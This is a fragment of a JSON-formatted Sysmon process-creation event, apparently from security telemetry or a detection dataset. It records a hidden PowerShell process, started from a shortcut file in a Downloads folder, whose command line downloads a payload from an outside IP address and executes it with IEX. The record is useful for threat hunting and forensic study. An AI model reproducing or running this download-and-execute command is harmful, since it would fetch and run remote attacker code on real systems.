                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid=5240FBE6-DADD-62BD-AD00-000000002400; ProcessId=2872; Product=Microsoft Windows Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid=5240FBE6-DACE-62BD-9800-000000002400; User=work\\admin; Hashes=MD5=A575A7610E5F003CC36DF39E07C4BA7D,SHA256=006CEF6EF6488721895D93E4CEF7FA0709C2692D74BDE1E22E2A8719B2A86218,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; FileVersion=10.0.14409.1005 (rs1_srvoob.161208-1155); ParentProcessId=2312; CurrentDirectory=C:\\Users\\admin\\Downloads\\; CommandLine=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(\u0027http://120.48.85.228:80/favicon\u0027))\"; EventID=1; LogonGuid=5240FBE6-DA52-62BD-191B-010000000000; LogonId=72473; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; ParentCommandLine=c:/windows/system32/WindowsPowerShell/v1.0/powershell.exe start-process ??:??????.lnk; UtcTime=2022-06-30 17:18:21.312; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
